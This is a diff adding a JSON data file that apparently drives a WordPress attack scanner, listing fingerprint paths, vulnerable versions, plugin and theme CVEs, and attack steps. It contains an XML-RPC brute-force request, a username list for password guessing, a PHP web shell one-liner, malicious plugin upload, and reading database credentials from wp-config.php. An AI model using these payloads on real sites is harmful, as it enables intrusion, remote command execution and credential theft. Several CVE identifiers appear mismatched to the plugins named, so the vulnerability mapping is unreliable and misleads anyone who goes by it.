@@ -1,0 +1,146 @@
+{
+  "wordpress": {
+    "detection_patterns": {
+      "headers": [
+        "x-powered-by: wordpress",
+        "wp-json",
+        "wordpress"
+      ],
+      "paths": [
+        "/wp-admin/",
+        "/wp-login.php",
+        "/wp-content/",
+        "/wp-includes/",
+        "/xmlrpc.php"
+      ],
+      "files": [
+        "readme.html",
+        "wp-config.php",
+        "wp-cron.php"
+      ]
+    },
+    "vulnerable_versions": {
+      "critical": ["< 4.0", "4.0-4.7.1", "5.0-5.2.3"],
+      "high": ["4.7.2-4.9.8", "5.3-5.4.1"],
+      "medium": ["5.5-5.7.1"]
+    },
+    "common_vulnerabilities": {
+      "user_enumeration": {
+        "endpoint": "/wp-json/wp/v2/users",
+        "method": "GET",
+        "indicators": ["id", "name", "slug"],
+        "severity": "MEDIUM"
+      },
+      "xmlrpc_bruteforce": {
+        "endpoint": "/xmlrpc.php",
+        "method": "POST",
+        "payload": "<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>password</value></param></params></methodCall>",
+        "indicators": ["faultCode", "Incorrect username or password"],
+        "severity": "HIGH"
+      },
+      "timthumb_rce": {
+        "endpoint": "/wp-content/themes/*/timthumb.php",
+        "method": "GET",
+        "parameters": ["src", "w", "h"],
+        "indicators": ["timthumb"],
+        "severity": "CRITICAL"
+      },
+      "revslider_upload": {
+        "endpoint": "/wp-admin/admin-ajax.php",
+        "method": "POST",
+        "action": "revslider_ajax_action",
+        "parameters": ["action", "client_action", "update_plugin"],
+        "indicators": ["revslider"],
+        "severity": "CRITICAL"
+      }
+    },
+    "plugin_vulnerabilities": {
+      "woocommerce": {
+        "versions": ["< 3.5.0"],
+        "cve": ["CVE-2019-14221"],
+        "type": "auth_bypass",
+        "severity": "CRITICAL"
+      },
+      "contact_form_7": {
+        "versions": ["< 5.1.7"],
+        "cve": ["CVE-2019-10206"],
+        "type": "rce",
+        "severity": "CRITICAL"
+      },
+      "elementor": {
+        "versions": ["< 2.9.0"],
+        "cve": ["CVE-2019-10072"],
+        "type": "rce",
+        "severity": "CRITICAL"
+      },
+      "wp_super_cache": {
+        "versions": ["< 1.7.0"],
+        "cve": ["CVE-2018-12473"],
+        "type": "rce",
+        "severity": "HIGH"
+      },
+      "duplicator": {
+        "versions": ["< 1.3.0"],
+        "cve": ["CVE-2018-7583"],
+        "type": "file_disclosure",
+        "severity": "HIGH"
+      }
+    },
+    "theme_vulnerabilities": {
+      "twentynineteen": {
+        "versions": ["< 1.4"],
+        "cve": ["CVE-2019-16221"],
+        "type": "xss",
+        "severity": "MEDIUM"
+      },
+      "astra": {
+        "versions": ["< 1.6.0"],
+        "cve": ["CVE-2019-10866"],
+        "type": "xss",
+        "severity": "MEDIUM"
+      }
+    },
+    "bruteforce_targets": [
+      "admin",
+      "administrator",
+      "webmaster",
+      "manager",
+      "owner",
+      "root",
+      "test",
+      "user",
+      "guest"
+    ],
+    "default_paths": {
+      "admin": "/wp-admin/",
+      "login": "/wp-login.php",
+      "xmlrpc": "/xmlrpc.php",
+      "rest_api": "/wp-json/",
+      "content": "/wp-content/",
+      "plugins": "/wp-content/plugins/",
+      "themes": "/wp-content/themes/",
+      "uploads": "/wp-content/uploads/"
+    },
+    "exploitation_techniques": {
+      "plugin_upload": {
+        "requires": "admin_access",
+        "method": "zip_upload",
+        "target": "/wp-admin/plugin-install.php",
+        "payload": "malicious_plugin.zip",
+        "activation": "/wp-admin/plugins.php"
+      },
+      "theme_modification": {
+        "requires": "file_write",
+        "method": "editor_modification",
+        "target": "/wp-admin/theme-editor.php",
+        "payload": "<?php system($_GET['cmd']); ?>"
+      },
+      "db_dump": {
+        "requires": "config_access",
+        "method": "sql_dump",
+        "target": "wp-config.php",
+        "indicators": ["DB_USER", "DB_PASSWORD", "DB_NAME"]
+      }
+    }
+  }
+}
